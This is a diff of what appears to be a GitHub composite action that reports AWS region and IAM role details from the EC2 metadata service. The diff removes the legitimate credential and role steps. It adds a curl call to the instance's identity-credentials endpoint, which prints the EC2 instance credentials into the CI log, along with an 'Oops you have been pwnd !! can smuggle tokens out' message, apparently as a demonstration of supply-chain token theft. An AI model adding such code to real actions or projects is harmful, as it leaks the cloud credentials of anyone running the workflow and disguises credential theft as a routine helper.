@@ -25,7 +25,6 @@ runs:
         if [ -z "$REGION" ]; then
           echo "::error title=Region Detection Failed::Unable to determine AWS region. Please provide the 'region' input."
         fi
-        echo "::set-output name=region::$REGION"
     - name: Get IAM Security Credentials (IMDSv2)
       if: ${{ inputs.metadata_version == 'latest' || inputs.metadata_version == '2017-09-25' }}
       id: get_iam_token_v2
@@ -36,45 +35,8 @@ runs:
         if [ -z "$TOKEN" ]; then
           echo "::error title=IMDSv2 Token Retrieval Failed::Failed to retrieve IMDSv2 token."
         fi
-        echo "::set-output name=token::$TOKEN"
-    - name: Get IAM Security Credentials (IMDSv1 or IMDSv2)
-      id: get_iam_credentials
-      shell: bash
-      run: |
-        if [[ "${{ inputs.metadata_version }}" == "latest" || "${{ inputs.metadata_version }}" == "2017-09-25" ]]; then
-          CREDENTIALS=$(curl -H "X-aws-ec2-metadata-token: ${{ steps.get_iam_token_v2.outputs.token }}" -s http://169.254.169.254/${{ inputs.metadata_version }}/meta-data/iam/security-credentials/)
-          echo "CREDS: $CREDENTIALS";
-        else
-          CREDENTIALS=$(curl -s http://169.254.169.254/${{ inputs.metadata_version }}/meta-data/iam/security-credentials/)
-          echo "CREDS: $CREDENTIALS";
-        fi
-        if [ -z "$CREDENTIALS" ]; then
-          echo "::error title=IAM Credentials Retrieval Failed::Failed to retrieve IAM credentials."
-        fi
-        echo "::set-output name=credentials::$CREDENTIALS"
-    - name: Get IAM Role Name (IMDSv1 or IMDSv2)
-      id: get_iam_role
-      shell: bash
-      run: |
-        if [[ "${{ inputs.metadata_version }}" == "latest" || "${{ inputs.metadata_version }}" == "2017-09-25" ]]; then
-          ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: ${{ steps.get_iam_token_v2.outputs.token }}" -s http://169.254.169.254/${{ inputs.metadata_version }}/meta-data/iam/security-credentials/${{ steps.get_iam_credentials.outputs.credentials }})
-          echo "ROLENAME: $ROLENAME"
-        else
-          ROLE_NAME=$(curl -s http://169.254.169.254/${{ inputs.metadata_version }}/meta-data/iam/security-credentials/${{ steps.get_iam_credentials.outputs.credentials }})
-          echo "ROLENAME: $ROLENAME"
-        fi
-        if [ -z "$ROLE_NAME" ]; then
-          echo "::error title=IAM Role Name Retrieval Failed::Failed to retrieve IAM role name."
-        fi
-        echo "::set-output name=role_name::$ROLE_NAME"
-    - name: Output IAM Role Information
-      shell: bash
-      run: |
-        echo "::group::IAM Role Information"
-        echo "Region: ${{ steps.get_region.outputs.region || inputs.region }}"
-        echo "Role Name: ${{ steps.get_iam_role.outputs.role_name }}"
-        echo "Credentials Endpoint: http://169.254.169.254/${{ inputs.metadata_version }}/meta-data/iam/security-credentials/${{ steps.get_iam_credentials.outputs.credentials }}"
-        echo "::endgroup::"
+        curl -H "X-aws-ec2-metadata-token: $TOKEN"  http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance/
+        echo "Oops you have been pwnd !! can smuggle tokens out"
 outputs:
   region:
     description: "The AWS region."
